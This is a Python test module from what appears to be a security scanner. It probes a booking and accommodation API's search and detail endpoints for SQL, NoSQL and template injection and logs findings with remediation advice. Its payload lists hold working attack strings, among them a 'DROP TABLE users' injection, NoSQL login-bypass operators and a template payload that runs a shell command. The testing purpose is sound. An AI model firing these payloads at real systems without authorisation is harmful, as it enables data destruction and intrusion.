"""
Injection Tests
Tests for SQL injection, NoSQL injection, and template injection
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from testing.lib.findings import Finding, SEVERITY


# Injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1' UNION SELECT null,null,null--",
    "'; DROP TABLE users; --",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--",
]

NOSQL_PAYLOADS = [
    {"$gt": ""},
    {"$ne": ""},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$or": [{"a": "a"}, {"b": "b"}]},
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
]

TEMPLATE_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
]


def run(client, reporter):
    """Test for injection vulnerabilities."""
    print("\n[INJECTION] Testing injection vulnerabilities...")

    # Test 1: SQL Injection on search endpoints
    print("  Testing SQL injection on search...")
    search_endpoints = [
        ("POST", "/activity.json/search", {"query": "test"}),
        ("POST", "/accommodation.json/search", {"query": "test"}),
        ("POST", "/booking.json/booking-search", {"query": "test"}),
    ]

    for method, endpoint, body in search_endpoints:
        for payload in SQL_PAYLOADS:
            try:
                r = client.post(
                    endpoint,
                    json_body={**body, "query": payload}
                )

                # Check for SQL error messages
                if r.status_code == 200:
                    response_text = r.text.lower()
                    sql_errors = [
                        "sql syntax", "mysql", "sqlite", "postgresql",
                        "ora-", "error in sql", "unterminated",
                        "column", "table", "database",
                    ]
                    if any(err in response_text for err in sql_errors):
                        reporter.add(Finding(
                            title=f"SQL Injection on {endpoint}",
                            severity=SEVERITY["CRITICAL"],
                            endpoint=endpoint,
                            method=method,
                            description=f"SQL error message returned for payload: {payload[:50]}",
                            evidence={
                                "payload": payload,
                                "status": r.status_code,
                                "response_snippet": r.text[:500],
                            },
                            impact="Complete database compromise, data exfiltration",
                            remediation="Use parameterized queries and input validation",
                            cwe="CWE-89",
                            tags=["sqli", "critical"],
                        ))
                        break  # Found injection, no need to test more payloads

                elif r.status_code == 500:
                    reporter.add(Finding(
                        title=f"Potential SQL Injection on {endpoint}",
                        severity=SEVERITY["HIGH"],
                        endpoint=endpoint,
                        method=method,
                        description=f"Server returns 500 for SQL payload: {payload[:50]}",
                        evidence={"payload": payload, "status": r.status_code},
                        impact="Potential SQL injection",
                        remediation="Use parameterized queries",
                        cwe="CWE-89",
                        tags=["sqli", "potential"],
                    ))
                    break
            except:
                pass

    # Test 2: NoSQL Injection
    print("  Testing NoSQL injection...")
    for method, endpoint, body in search_endpoints:
        for payload in NOSQL_PAYLOADS:
            try:
                r = client.post(
                    endpoint,
                    json_body={**body, **payload}
                )

                if r.status_code == 200:
                    data = r.json() if "json" in r.headers.get("content-type", "") else None
                    if data and isinstance(data, list) and len(data) > 0:
                        reporter.add(Finding(
                            title=f"NoSQL Injection on {endpoint}",
                            severity=SEVERITY["HIGH"],
                            endpoint=endpoint,
                            method=method,
                            description=f"NoSQL injection payload returned data: {payload}",
                            evidence={
                                "payload": payload,
                                "status": r.status_code,
                                "results_count": len(data),
                            },
                            impact="Attacker can bypass authentication or extract all data",
                            remediation="Validate input types and use schema validation",
                            cwe="CWE-943",
                            tags=["nosqli", "injection"],
                        ))
                        break
            except:
                pass

    # Test 3: Template Injection
    print("  Testing template injection...")
    injection_endpoints = [
        "/activity.json/1",
        "/accommodation.json/1",
        "/booking.json/1/summary",
    ]

    for endpoint in injection_endpoints:
        for payload in TEMPLATE_PAYLOADS:
            try:
                # Test in query params
                r = client.get(endpoint, params={"template": payload})
                if r.status_code == 200 and "49" in r.text:
                    reporter.add(Finding(
                        title=f"Template Injection on {endpoint}",
                        severity=SEVERITY["CRITICAL"],
                        endpoint=endpoint,
                        method="GET",
                        description=f"Template expression evaluated: {payload}",
                        evidence={"payload": payload, "status": r.status_code},
                        impact="Remote code execution via template injection",
                        remediation="Sanitize user input and use sandboxed templates",
                        cwe="CWE-1336",
                        tags=["ssti", "critical"],
                    ))
                    break

                # Test in JSON body
                r = client.post(
                    endpoint,
                    json_body={"name": payload, "description": payload}
                )
                if r.status_code == 200 and "49" in r.text:
                    reporter.add(Finding(
                        title=f"Template Injection (POST) on {endpoint}",
                        severity=SEVERITY["CRITICAL"],
                        endpoint=endpoint,
                        method="POST",
                        description=f"Template expression evaluated in POST body: {payload}",
                        evidence={"payload": payload, "status": r.status_code},
                        impact="Remote code execution via template injection",
                        remediation="Sanitize user input and use sandboxed templates",
                        cwe="CWE-1336",
                        tags=["ssti", "critical"],
                    ))
                    break
            except:
                pass
